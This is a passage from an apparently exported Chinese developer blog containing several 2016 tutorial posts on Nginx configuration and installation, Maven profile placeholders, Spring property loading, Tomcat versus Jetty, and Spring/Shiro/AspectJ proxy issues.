实际使用建议1234567891011121314151617181920212223242526272829303132所以实际使用中，个人觉得至少有三个匹配规则定义，如下：#直接匹配网站根，通过域名访问网站首页比较频繁，使用这个会加速处理，官网如是说。#这里是直接转发给后端应用服务器了，也可以是一个静态首页# 第一个必选规则location &#x3D; &#x2F; &#123;proxy_pass http:&#x2F;&#x2F;tomcat:8080&#x2F;index&#125;# 第二个必选规则是处理静态文件请求，这是nginx作为http服务器的强项# 有两种配置模式，目录匹配或后缀匹配,任选其一或搭配使用location ^~ &#x2F;static&#x2F; &#123;root &#x2F;webroot&#x2F;static&#x2F;;&#125;location ~* \\.(gif|jpg|jpeg|png|css|js|ico)$ &#123;root &#x2F;webroot&#x2F;res&#x2F;;&#125;#第三个规则就是通用规则，用来转发动态请求到后端应用服务器#非静态文件请求就默认是动态请求，自己根据实际把握#毕竟目前的一些框架的流行，带.php,.jsp后缀的情况很少了location &#x2F; &#123;proxy_pass http:&#x2F;&#x2F;tomcat:8080&#x2F;&#125; Rewrite规则rewrite功能就是，使用nginx提供的全局变量或自己设置的变量，结合正则表达式和标志位实现url重写以及重定向。rewrite只能放在server{},location{},if{}中，并且只能对域名后边的除去传递的参数外的字符串起作用，例如 http://seanlook.com/a/we/index.php?id=1&amp;u=str 只对/a/we/index.php重写。语法rewrite regex replacement [flag]; 如果相对域名或参数字符串起作用，可以使用全局变量匹配，也可以使用proxy_pass反向代理。 表明看rewrite和location功能有点像，都能实现跳转，主要区别在于rewrite是在同一域名内更改获取资源的路径，而location是对一类路径做控制访问或反向代理，可以proxy_pass到其他机器。很多情况下rewrite也会写在location里，它们的执行顺序是： 执行server块的rewrite指令 执行location匹配 执行选定的location中的rewrite指令 如果其中某步URI被重写，则重新循环执行1-3，直到找到真实存在的文件；循环超过10次，则返回500 Internal Server Error错误。 flag标志位 last : 相当于Apache的[L]标记，表示完成rewrite break : 停止执行当前虚拟主机的后续rewrite指令集 redirect : 返回302临时重定向，地址栏会显示跳转后的地址 permanent : 返回301永久重定向，地址栏会显示跳转后的地址 因为301和302不能简单的只返回状态码，还必须有重定向的URL，这就是return指令无法返回301,302的原因了。这里 last 和 break 区别有点难以理解： last一般写在server和if中，而break一般使用在location中 last不终止重写后的url匹配，即新的url会再从server走一遍匹配流程，而break终止重写后的匹配 break和last都能组织继续执行后面的rewrite指令 if指令与全局变量if判断指令语法为if(condition){…}，对给定的条件condition进行判断。如果为真，大括号内的rewrite指令将被执行，if条件(conditon)可以是如下任何内容： 当表达式只是一个变量时，如果值为空或任何以0开头的字符串都会当做false 直接比较变量和内容时，使用=或!= 正则表达式匹配，*不区分大小写的匹配，!~区分大小写的不匹配 -f和!-f用来判断是否存在文件-d和!-d用来判断是否存在目录-e和!-e用来判断是否存在文件或目录-x和!-x用来判断文件是否可执行 12345678910111213141516171819202122232425262728293031323334353637if ($http_user_agent ~ MSIE) &#123;rewrite ^(.*)$ &#x2F;msie&#x2F;$1 break;&#125; &#x2F;&#x2F;如果UA包含&quot;MSIE&quot;，rewrite请求到&#x2F;msid&#x2F;目录下if ($http_cookie ~* &quot;id&#x3D;([^;]+)(?:;|$)&quot;) &#123;set $id $1;&#125; &#x2F;&#x2F;如果cookie匹配正则，设置变量$id等于正则引用部分if ($request_method &#x3D; POST) &#123;return 405;&#125; &#x2F;&#x2F;如果提交方法为POST，则返回状态405（Method not allowed）。return不能返回301,302if ($slow) &#123;limit_rate 10k;&#125; &#x2F;&#x2F;限速，$slow可以通过 set 指令设置if (!-f $request_filename)&#123;break;proxy_pass http:&#x2F;&#x2F;127.0.0.1;&#125; &#x2F;&#x2F;如果请求的文件名不存在，则反向代理到localhost 。这里的break也是停止rewrite检查if ($args ~ post&#x3D;140)&#123;rewrite ^ http:&#x2F;&#x2F;example.com&#x2F; permanent;&#125; &#x2F;&#x2F;如果query string中包含&quot;post&#x3D;140&quot;，永久重定向到example.comlocation ~* \\.(gif|jpg|png|swf|flv)$ &#123;valid_referers none blocked www.jefflei.com www.leizhenfang.com;if ($invalid_referer) &#123;return 404;&#125; &#x2F;&#x2F;防盗链&#125; 全局变量下面是可以用作if判断的全局变量 $args ： #这个变量等于请求行中的参数，同$query_string $content_length ： 请求头中的Content-length字段。 $content_type ： 请求头中的Content-Type字段。 $document_root ： 当前请求在root指令中指定的值。 $host ： 请求主机头字段，否则为服务器名称。 $http_user_agent ： 客户端agent信息 $http_cookie ： 客户端cookie信息 $limit_rate ： 这个变量可以限制连接速率。 $request_method ： 客户端请求的动作，通常为GET或POST。 $remote_addr ： 客户端的IP地址。 $remote_port ： 客户端的端口。 $remote_user ： 已经经过Auth Basic Module验证的用户名。 $request_filename ： 当前请求的文件路径，由root或alias指令与URI请求生成。 $scheme ： HTTP方法（如http，https）。 $server_protocol ： 请求使用的协议，通常是HTTP/1.0或HTTP/1.1。 $server_addr ： 服务器地址，在完成一次系统调用后可以确定这个值。 $server_name ： 服务器名称。 $server_port ： 请求到达服务器的端口号。 $request_uri ： 包含请求参数的原始URI，不包含主机名，如：”/foo/bar.php?arg=baz”。 $uri ： 不带请求参数的当前URI，$uri不包含主机名，如”/foo/bar.html”。 $document_uri ： 与$uri相同。 例：http://localhost:88/test1/test2/test.php $host：localhost$server_port：88$request_uri：http://localhost:88/test1/test2/test.php$document_uri：/test1/test2/test.php$document_root：/var/www/html$request_filename：/var/www/html/test1/test2/test.php rewrite实例123456789101112131415161718192021222324252627282930313233343536373839404142434445http &#123;# 定义image日志格式log_format imagelog &#39;[$time_local] &#39; $image_file &#39; &#39; $image_type &#39; &#39; $body_bytes_sent &#39; &#39; $status;# 开启重写日志rewrite_log on;server &#123;root &#x2F;home&#x2F;www;location &#x2F; &#123;# 重写规则信息error_log logs&#x2F;rewrite.log notice;# 注意这里要用‘’单引号引起来，避免&#123;&#125;rewrite &#39;^&#x2F;images&#x2F;([a-z]&#123;2&#125;)&#x2F;([a-z0-9]&#123;5&#125;)&#x2F;(.*)\\.(png|jpg|gif)$&#39; &#x2F;data?file&#x3D;$3.$4;# 注意不能在上面这条规则后面加上“last”参数，否则下面的set指令不会执行set $image_file $3;set $image_type $4;&#125;location &#x2F;data &#123;# 指定针对图片的日志格式，来分析图片类型和大小access_log logs&#x2F;images.log mian;root &#x2F;data&#x2F;images;# 应用前面定义的变量。判断首先文件在不在，不在再判断目录在不在，如果还不在就跳转到最后一个url里try_files &#x2F;$arg_file &#x2F;image404.html;&#125;location &#x3D; &#x2F;image404.html &#123;# 图片不存在返回特定的信息return 404 &quot;image not found\\n&quot;;&#125;&#125;","tags":[{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"Nginx","slug":"Nginx","permalink":"http://yoursite.com/tags/Nginx/"}]},{"title":"Nginx(二):Nginx基本知识","date":"2016-10-24T21:00:00.000Z","path":"2016/10/25/Nginx二Nginx基本知识/","text":"Nginx配置文件基本原理Nginx本身是一个网络服务的路由器，网络服务包括HTTP和tcp协议，其配置文件是类似Json的一种格式，其中以server、location最为主要 http &amp;&amp; serverHTTP代表在该计算机上启动HTTP路由，可以开启不同的server服务，所以HTTP内可以包括多个server 12345678910111213141516171819http &#123; server &#123; # 在80端口监听http服务 # 正常情况下会和个人电脑的浏览器冲突,但是服务器上一般没浏览器 # 因为浏览器之所以能上网，就是在80端口不停的监听http服务 listen 80; server_name localhost; ...... &#125; server &#123; # 在8080端口监听http服务 listen 8080; server_name localhost; ...... &#125; ......&#125; location服务器入门中讲到服务器的一个基本原理就是网络地址和磁盘地址转换，静态服务器本身存在的意义便在此 如果我们以 www.domin.com:8080/content/a 来访问服务器，会进入Nginx配置文件中在8080 listen的server Host path www.domin.com /content/a 根据以上表格，我们可以将path对应到一个磁盘上的路径，使用的配置就是location 12345678910111213141516171819202122server &#123; listen 8080; ...... # 将 www.domin.com:8080 映射到服务器安装地址的html文件夹内 location &#x2F; &#123; root html; index index.html index.htm; &#125; # 将 wwww.domin.com:8080&#x2F;content&#x2F;* 映射到服务器主机的 &#x2F;usr&#x2F;local&#x2F;content地址 location &#x2F;content&#x2F; &#123; root &#x2F;usr&#x2F;local&#x2F;content; index index.html index.htm; &#125; # 将 wwww.domin.com:8080&#x2F;content&#x2F;a&#x2F;* 映射到服务器主机的 &#x2F;usr&#x2F;tmp&#x2F;a 地址 location &#x2F;content&#x2F;a&#x2F; &#123; root &#x2F;usr&#x2F;tmp&#x2F;a; index index.html index.htm; &#125;&#125; 从上文可以看出，我们不仅可以对网络地址的不同路径进行不同的目录映射，还可以为不同的目录指定不同的index文件 若在root目录下添加了文件或目录，请保证一定有 读和执行的权限 若要可写，则还需设置写权限 因为Mac电脑的权限管理很严格，在Mac中很容易出现，如果是Linux的root用户则少见 server name我开始学习的时候，对server中除了listen 还有一个 server name 比较困惑，参考Nginx官方文章Nginx如何处理http服务，了解到Nginx可以对不同域名来的服务进行分类处理 由于DNS的存在，我们可以使用一个IP对应多个域名，比如 www.a.com 和 www.b.com 这个称之为host，后边的才是路径path，Nginx会对HTTP的Request报文做如下处理 12345678POST &#x2F;psas&#x2F;bug&#x2F;image&#x2F;confirm HTTP&#x2F;1.1 &lt;&#x3D;&#x3D; 第一行才是pathAccept: application&#x2F;jsonContent-Type: text&#x2F;plain; charset&#x3D;utf-8Cookie: JSESSIONID&#x3D;h72ql6aHost: www.a.com:8080 &lt;&#x3D;&#x3D; 这一行是hostConnection: closeUser-Agent: Paw&#x2F;3.0.12 (Macintosh; OS X&#x2F;10.12.0) GCDHTTPRequestContent-Length: 366 接收到请求后去HTTP报文头拿host字段 去和server name字段进行匹配，哪个匹配上用哪个处理 如果没有匹配上，就用listen了当前端口的默认server处理 默认server可以自己设置，如果没有设置，默认配置文件中最靠前是默认 Nginx强大在哪里Nginx不仅可以通过上文举例中的 固定字符 进行匹配， 还可以通过 正则表达式或者通配符 进行模糊匹配 而且不仅有目录映射功能,还可以进行HTTP的转发和代理，才这么流行，所谓反向代理就是基于其来完成的 Nginx配置详解具体复杂的配置如何书写，请参考这篇十分强大通俗易懂的教程，本系列下一篇对Blog进行一份备份以防丢失","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"Tutorial","slug":"Tutorial","permalink":"http://yoursite.com/tags/Tutorial/"}]},{"title":"Nginx(一):安装Nginx","date":"2016-10-24T20:00:00.000Z","path":"2016/10/25/Nginx一安装Nginx/","text":"Nginx是什么Nginx是一个毛子搞得静态服务器，一般来讲可以用来做 反向代理 资源服务器(图片服务器为主) 安装完毕后，记得打开防火墙和端口 参考文章服务器入门 Linux下安装Nginx下载安装包首先下载安装包到目录 /usr/local 里，我们使用的是1.10.1版本 12cd &#x2F;usr&#x2F;localtar zvxf nginx-1.10.1.tar.gz 解压缩，其中 z代表tar.gz格式 v代表显示详情 x代表解压 f代表指定文件 安装依赖在Linux中是编译安装，所以要准备一系列工具 1yum install pcre-devel make gcc gcc-c++ ncurses-devel perl zlib zlib-devel openssl openssl-devel 工具目的 程序 编译器 make gcc gcc-c++ 安全协议 openssl openssl-devel 语言 perl脚本语言 正则表达式库 pcre-devel(用于perl语言) 压缩库 zlib zlib-devel 字符处理库 ncurses-devel 然后选择y进行安装 编译安装Nginx首先新建一个nginx安装目录，位于 /usr/local/nginx， 然后切换到安装包nginx-1.10.1内 12mkdir nginxcd nginx-1.10.1 执行Configuration配置检查文件，指定目录到刚刚新建的nginx目录里 1.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx Configuration配置完成后输出一系列目录和信息 1234567891011121314151617181920Configuration summary + using system PCRE library + OpenSSL library is not used + md5: using system crypto library + sha1: using system crypto library + using system zlib library nginx path prefix: &quot;&#x2F;usr&#x2F;local&#x2F;nginx&quot; nginx binary file: &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx&quot; nginx modules path: &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;modules&quot; nginx configuration prefix: &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&quot; nginx configuration file: &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf&quot; nginx pid file: &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;nginx.pid&quot; nginx error log file: &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;error.log&quot; nginx http access log file: &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;access.log&quot; nginx http client request body temporary files: &quot;client_body_temp&quot; nginx http proxy temporary files: &quot;proxy_temp&quot; nginx http fastcgi temporary files: &quot;fastcgi_temp&quot; nginx http uwsgi temporary files: &quot;uwsgi_temp&quot; nginx http scgi temporary files: &quot;scgi_temp&quot; 执行make操作和make install进行安装 12makemake install 移动命令工具安装完成后，将nginx命令移动到$PATH的目录下，这样就不用每次都cd到 /usr/local/sbin 里去运行了 1mv &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx &#x2F;usr&#x2F;local&#x2F;bin&#x2F; 设定配置和修改端口修改nginx.conf配置文件中的默认端口，以防冲突，默认端口是80 12345678910111213vim &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf&#x2F;&#x2F;进入vim修改如下server &#123; listen 8080; #listen 80; server_name localhost; #charset koi8-r; ......&#125; 然后使用nginx -c 命令指定配置文件,接着使用 nginx -t 命令检查配置文件是否正确，得到反馈syntax is ok 12345nginx -c &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.confnginx -tnginx: the configuration file &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf syntax is oknginx: configuration file &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf test is successfulnginx -s reload 使用nginx -s reload 重新加载nginx配置服务 小问题如果碰见如下问题，使用 nginx -s stop 停止服务，重新指定配置文件然后检查和reload操作即可 1nginx: [error] invalid PID number &quot;&quot; in &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;nginx.pid&quot; Mac下安装NginxMac 下安装Nginx就很简单啦，先装个homebrew，然后执行 1brew install nginx 就完成了一键安装，虽然是不是最新版本，你就凑合着调试用吧，但是homebrew安装的有一点不好，和Linux的配置文件还有root目录不在一起 Nginx的root目录问题和配置文件问题安装路径首先是安装路径的问题，Linux下的安装目录是在configuration时指定的 prifix=/use/local 而 homebrew是安装在brew的目录下 系统 路径 安装工具 Linux /usr/local/nginx camke gcc 编译安装 Mac /usr/local/Cellar/nginx homebrew一键安装 配置文件位置不同采用homebrew安装的nginx配置文件路径也不同 系统 路径 Linux /usr/local/nginx/conf/nginx.conf Mac /usr/local/etc/nginx/nginx.conf root目录其次两者root目录的文件性质也不同 系统 路径 备注 Linux /usr/local/nginx/html 正常的文件夹 Mac /usr/local/Cellar/nginx/版本号/html 指向/usr/local/var/www的软链接","tags":[{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"Nginx","slug":"Nginx","permalink":"http://yoursite.com/tags/Nginx/"}]},{"title":"Maven通过Profile占位符切换环境和接口地址","date":"2016-10-23T22:00:00.000Z","path":"2016/10/24/Maven通过Profile占位符切换环境和接口地址/","text":"需求在文章占位符的使用我们提到了占位符的三个阶段，我们这里来讲讲具体的应用 不同环境下applicationContext配置不同 不同环境下，图片服务器地址不同 工程结构目录 Profile在Maven中，有一个选项叫做Profile，它会根据你选的Profile不同，用Profile内的内容合并到当前pom.xml中 参考图片目录绿色部分 如果存在冲突，则以Profile中为准 123456789101112131415161718&lt;profiles&gt; &lt;profile&gt; &lt;id&gt;local&lt;&#x2F;id&gt; &lt;&#x3D;&#x3D;本地环境 &lt;properties&gt; &lt;dev.environment&gt;local&lt;&#x2F;dev.environment&gt; &lt;&#x2F;properties&gt; &lt;activation&gt; &lt;activeByDefault&gt;true&lt;&#x2F;activeByDefault&gt; &lt;&#x3D;&#x3D;默认激活的环境 &lt;&#x2F;activation&gt; &lt;&#x2F;profile&gt; &lt;profile&gt; &lt;id&gt;product&lt;&#x2F;id&gt; &lt;&#x3D;&#x3D;生产环境 &lt;properties&gt; &lt;dev.environment&gt;product&lt;&#x2F;dev.environment&gt; &lt;&#x2F;properties&gt; &lt;&#x2F;profile&gt;&lt;&#x2F;profiles&gt; 从上文的Profile中我们可以看到，我设定了两个环境 本地环境 生产环境 它们都有一个变量叫做 dev.environment 只不过在不同的环境里，对应的值不同 动态的Build标签设定好了Profile，我们把占位符文章中的Build稍加修改 123456789101112&lt;build&gt; &lt;finalName&gt;psas&lt;&#x2F;finalName&gt; &lt;filters&gt; &lt;filter&gt;environment&#x2F;$&#123;dev.environment&#125;.properties&lt;&#x2F;filter&gt; &lt;&#x3D;&#x3D;动态的占位符 &lt;&#x2F;filters&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src&#x2F;main&#x2F;resources&#x2F;&lt;&#x2F;directory&gt; &lt;filtering&gt;true&lt;&#x2F;filtering&gt; &lt;&#x2F;resource&gt; &lt;&#x2F;resources&gt;&lt;&#x2F;build&gt; 可以看到我们设定了占位符，通过这种设置，在Maven-Validate阶段会发生如下操作 通过选取Profile，Maven把Profile中的标签加载到pom文件 pom的properties标签中出现 dev.environment Maven-Validate第一次替换占位符替换掉了filter中的 ${dev.environment} 准备两份properties文件由于根据Profile中 dev.environment 的值不同，我们需要两份properties文件 ，这两份文件并不在src目录下，而是在工程的environment文件下 参考目录图片红色部分 local.properties 12345env.image.server.disk.root &#x3D; &#x2F;Users&#x2F;Apple&#x2F;Server&#x2F;imageenv.image.server.net.root &#x3D; http:&#x2F;&#x2F;localhost:8888env.begin &#x3D; &lt;!--env.end &#x3D; --&gt; product.properties 12345env.image.server.disk.root &#x3D; &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;home&#x2F;8080&#x2F;static&#x2F;imageenv.image.server.net.root &#x3D; http:&#x2F;&#x2F;124.74.76.126:8080&#x2F;static&#x2F;imageenv.begin &#x3D;env.end &#x3D; 这两份文件是Maven用来供过滤器使用的，并不会加载到War包的class文件下， 所以并不在resources中 切换applicationContext由于applicationContext是在工程的resources文件下，即目录src/main/resources/ 参考图片目录黄色部分 所以我们可以通过注释符号，来开启和关闭不同环境下的的功能，比如在Local环境下关闭拦截器，而在Product环境下开启拦截器 12345&lt;beans&gt; ...... $&#123;env.shiro.begin&#125;&lt;import resource&#x3D;&quot;spring-mvc-interceptor.xml&quot;&#x2F;&gt;$&#123;env.shiro.end&#125; ......&lt;&#x2F;beans&gt; 如果在Local的Profile下，Maven-Package会把War包中的applicationContext.xml会被替换为注释状态 12345&lt;beans&gt; ...... &lt;!--&lt;import resource&#x3D;&quot;spring-mvc-interceptor.xml&quot;&#x2F;&gt;--&gt; ......&lt;&#x2F;beans&gt; 而在Product的Profile下，Maven-Package会把War包中的applicationContext.xml会被替换为 12345&lt;beans&gt; ...... &lt;import resource&#x3D;&quot;spring-mvc-interceptor.xml&quot;&#x2F;&gt; ......&lt;&#x2F;beans&gt; 切换接口地址另一种情况就是切换接口地址，比如图片服务器的硬盘地址和网络地址，在不同的Profile下是不同的 如果是C相关的语言，我们可以通过宏的define undefine 之类的来完成 Java里没有宏，可以通过Spring读取的properties内容不同来完成 动态的Spring-properties我们在ApplicationContext的 PropertiesFactoryBean 能读取的文件 upload.properties 中采用动态方式 参考图片目录黄色部分 12image.server.disk.root &#x3D; $&#123;env.image.server.disk.root&#125;image.server.net.root &#x3D; $&#123;env.image.server.net.root&#125; 由于占位符替换的第二步Maven-Package阶段，也会根据Profile不同替换为不同值，然后在代码中，我们可以通过Spring注解给其赋值 12345@Value(&quot;$&#123;image.server.disk.root&#125;&quot;)private String diskRootPath;@Value(&quot;$&#123;image.server.net.root&#125;&quot;)private String netRootPath; 从而 获得不同的硬盘地址和网络地址","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Maven","slug":"Maven","permalink":"http://yoursite.com/tags/Maven/"},{"name":"Configure","slug":"Configure","permalink":"http://yoursite.com/tags/Configure/"}]},{"title":"$美元符号在配置文件中的意义","date":"2016-10-23T21:00:00.000Z","path":"2016/10/24/美元符号在配置文件中的意义/","text":"$符号叫什么$符号加上一个大括号，学术名称叫做 占位符 ，用来占住位置，让其它功能在某一个时间替换掉它，替换的来源一般是properties文件。 1$&#123;data&#125; 通常在各种配置文件中会有三次替换过程 替换过程 操作者 状态 War包文件 pom.xml的Validate时期 Maven 静态 pom文件不会进入War包 Maven根据pom文件的Package时期 Maven 静态 War包中会被替换文本 Spring启动后的启动后 Spring 动态 不会被替换文本，运行时获取 关于这三次替换过程的具体应用，可以参考文章Maven通过Profile切换环境 Maven-Validate在Maven中可以采用properties标签定义一些变量，然后使用占位符使用这些变量 123456789101112&lt;properties&gt; &lt;spring.version&gt;4.1.9.RELEASE&lt;&#x2F;spring.version&gt;&lt;&#x2F;properties&gt;&lt;dependencies&gt; &lt;!--Spring--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-core&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;spring.version&#125;&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt; 例如控制dependency的版本，这些会在Validate的时候去取值，不会进入War包 Maven-PackageMaven可以通过Build选项中的filters来指定一些properties文件，来获取变量值 然后用获得值去替换resource下指定了filtering==true的文件中的占位符${} 123456789101112&lt;build&gt; &lt;finalName&gt;psas&lt;&#x2F;finalName&gt; &lt;filters&gt; &lt;filter&gt;environment&#x2F;local.properties&lt;&#x2F;filter&gt; &lt;&#x2F;filters&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src&#x2F;main&#x2F;resources&#x2F;&lt;&#x2F;directory&gt; &lt;filtering&gt;true&lt;&#x2F;filtering&gt; &lt;&#x2F;resource&gt; &lt;&#x2F;resources&gt;&lt;&#x2F;build&gt; 通常resources都是web层的Spring配置文件，例如 applicationContext.xml 或 spring-mvc.xml 等等 在Package后的War包中，${}会被替换掉，替换成propertes中对应的文本 Spring配置文件占位符Spring可以通过 PropertiesFactoryBean 来加载配置文件，然后使用 PreferencesPlaceholderConfigurer 来进行替换 12345678910111213&lt;!--读取配置文件--&gt;&lt;bean id&#x3D;&quot;PropertyPlaceholderConfigurer&quot; class&#x3D;&quot;org.springframework.beans.factory.config.PropertiesFactoryBean&quot;&gt; &lt;property name&#x3D;&quot;locations&quot;&gt; &lt;list&gt; &lt;value&gt;classpath:properties&#x2F;jdbc.properties&lt;&#x2F;value&gt; &lt;value&gt;classpath:properties&#x2F;upload.properties&lt;&#x2F;value&gt; &lt;&#x2F;list&gt; &lt;&#x2F;property&gt;&lt;&#x2F;bean&gt;&lt;!--加载配置--&gt;&lt;bean id&#x3D;&quot;propertyConfigurer&quot; class&#x3D;&quot;org.springframework.beans.factory.config.PreferencesPlaceholderConfigurer&quot;&gt; &lt;property name&#x3D;&quot;properties&quot; ref&#x3D;&quot;PropertyPlaceholderConfigurer&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; 这个替换过程发生在Spring启动之后的运行时(Runtime)，与上一步Maven-Package不同，在War包中的xml文件里${}符号仍在存在,由启动后的Spring去替换PropertiesFactoryBean加载的文本","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"Configure","slug":"Configure","permalink":"http://yoursite.com/tags/Configure/"}]},{"title":"Tomcat和Jetty的webapps文件夹区别","date":"2016-10-23T20:00:00.000Z","path":"2016/10/24/Tomcat和Jetty的webapps文件夹区别/","text":"Tomcat和Jetty的webapps文件夹区别关于服务器容器的目录结构参见文章服务器入门 webapps根目录Tomcat和Jetty的webapps根目录不同 容器名 根目录 Tomcat webapps/ROOT Jetty webapps 运行时区别问题发现于我想拿Jetty当图片服务器，上传图片到webapps文件夹里，这样我就不用再假设一个图片服务器了。。结果发现。。不行 容器名 运行时访问 Tomcat 移动文件至根目录，可以通过网络地址+文件名访问文件 Jetty 移动文件至根目录，不能访问 原因看过一篇文章讲Jetty之所以越来越流行，主要是由于其快的特性，一大原因就是 Jetty会把所有Web资源加载到内存中，所以运行时往磁盘目录移动文件，就无法访问，而Tomcat是基于磁盘的，可以随时访问磁盘中的变化","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"}]},{"title":"So Stupid I am，动态代理与反射同时使用","date":"2016-10-22T20:00:00.000Z","path":"2016/10/23/动态代理与反射同时使用/","text":"我的一个错误在文章反射调用事务方法导致事务失败和动态代理中取Target中，我曾经提到了，代理和反射无法同时使用，因为使用代理后，通过反射拿到的是动态代理的Class，需要取出Target才能找到方法。 事实是我错了，还是当时我太年轻 动态代理的结果 JDK的动态代理: 代理结果是一个 com.sun.proxy.$Proxy41 的Class CGLib的动态代理: 代理结果是一个 包名EnhancerBySpringCGLIB$27b0d993 的Class 代理Object里有什么JDK的动态代理里，是一个由ProxyFactory产生一个动态代理类，而CGLib的动态代理是由DefaultAopProxyFactory产生的动态代理类，参见切面编程3中的代码追踪可以看到详细过程。打断点看一下JDK里有一个名为h的成员变量而CGLib里是一堆Callback??的成员变量 代理Object的的方法可以看到代理的Object的名称都会有一个随机的号码，所以说其实该代理类是根据Target不同而产生的，那么我们调用 getMethods 就可以看到不管是哪种代理方法都会返回一堆函数，而函数里会有和Target同名的函数，说明代理类使用同名函数进行了重写，并且在同名函数内部调用了Target的原函数 我笨在哪里错误的思路在文章反射调用事务方法导致事务失败中，我采用的思路是: 先拿到需要反射对象的Class 然后通过Class名+约定字符串来拼接方法名 这就有个问题，被动态代理后的对象，Class变城了Proxy或者CGLib，导致我无法通过Class加约定字符串构造方法名。所以我先取出了Target，然后构造了方法名,接着使用Target去Invoke我查到找到的Method 问题就出在这里！！！我拿Target只是为了得到原本ClassName，当我构造好了方法名，我应该去Proxy类中去找方法，然后Invoke反射 当我得到了方法名，Target本身的意义就结束了，剩下反射工作，都可以使用Proxy来做了。 归纳也就是说，如果不是 使用Class名加约定字符串 来构造MethodName，而是事先就知道MethodName，就不用去取Target了，直接用ProxyObject去反射就好了 重复的轮子在文章动态代理中取Target我自己费了好大劲去Proxy类中取Target，其实Spring本身有这个方法在AopUtils里 1234import org.springframework.aop.support.AopUtils;clazz &#x3D; AopUtils.getTargetClass(service);","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Reflect","slug":"Reflect","permalink":"http://yoursite.com/tags/Reflect/"},{"name":"Error","slug":"Error","permalink":"http://yoursite.com/tags/Error/"}]},{"title":"切面编程(三):AspectJ与Shiro不兼容和Spring二次代理错误分析","date":"2016-10-20T22:00:00.000Z","path":"2016/10/21/切面编程三AspectJ与Shiro不兼容和Spring二次代理错误分析/","text":"Shiro与AspectJ的配置Shiro的配置根据我的BLOG文章和官方文档我们可以得知Shiro在使用注解的时的配置是 1234&lt;bean class&#x3D;&quot;org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator&quot; depends-on&#x3D;&quot;lifecycleBeanPostProcessor&quot;&#x2F;&gt;&lt;bean class&#x3D;&quot;org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor&quot;&gt; &lt;property name&#x3D;&quot;securityManager&quot; ref&#x3D;&quot;securityManager&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; 其基于注解的权限控制功能 根据类名可以推断是通过切面的Advisor来完成的(AuthorizationAttributeSourceAdvisor) 所以说它需要创建自己的动态代理类，是由Spring的DefaultAdvisorAutoProxyCreator动态代理创建的 SpringMVC中AspectJ的配置根据上文，启用基于注解的AspectJ就很简单了，因为基于注解的Shiro一般也在SpringMVC的Context里，我们采用如下配置 1&lt;aop:aspectj-autoproxy proxy-target-class&#x3D;&quot;true&quot;&#x2F;&gt; 在两者分别配置的时候，配置方法都是对的 但是一旦公用，会发现AspectJ会失效 失效的解决办法方法一解决办法也很简单，注释掉Shiro配置中的第一句 1&lt;!--&lt;bean class&#x3D;&quot;org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator&quot; depends-on&#x3D;&quot;lifecycleBeanPostProcessor&quot;&#x2F;&gt;--&gt; 注释之后Shiro的注解权限管理功能并不会失效，具体原因我们来细细分析 方法二给DefaultAdvisorAutoProxyCreator加入参数proxyTargetClass为true 123&lt;bean class&#x3D;&quot;org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator&quot; depends-on&#x3D;&quot;lifecycleBeanPostProcessor&quot;&gt; &lt;property name&#x3D;&quot;proxyTargetClass&quot; value&#x3D;&quot;true&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; 配置失效的原因原因在于二次代理 由于使用了aop:aspectj-autoproxy强制了proxy-target-class 也就是说对Web层的Class(主要是Controller)使用了CGLib代理 然后在Shiro进行代理时使用DefaultAdvisorAutoProxyCreator 原本应该判断Controller，发现没有任何接口，所以使用CGLib来代理 但是由于Controller已经被CGLib代理过一次了 DefaultAdvisorAutoProxyCreator拿到对不是Contoller本身，而是CGLib的代理结果 CGLib的代理结果本身是有接口的，干扰了DefaultAdvisorAutoProxyCreator的内部判断 使用JDK去代理CGLib的代理结果 结果Controller的函数时去了CGLib的接口中找方法名，发现方法不存在，导致代理失败 为什么会确定是这个原因，废了我好大功夫，详情请看代码追踪。。。。没精力就别看了 代码的追踪(可以不看)aspectj-autoproxy在配置文件中的 aop:aspectj-autoproxy 会最终交给名为 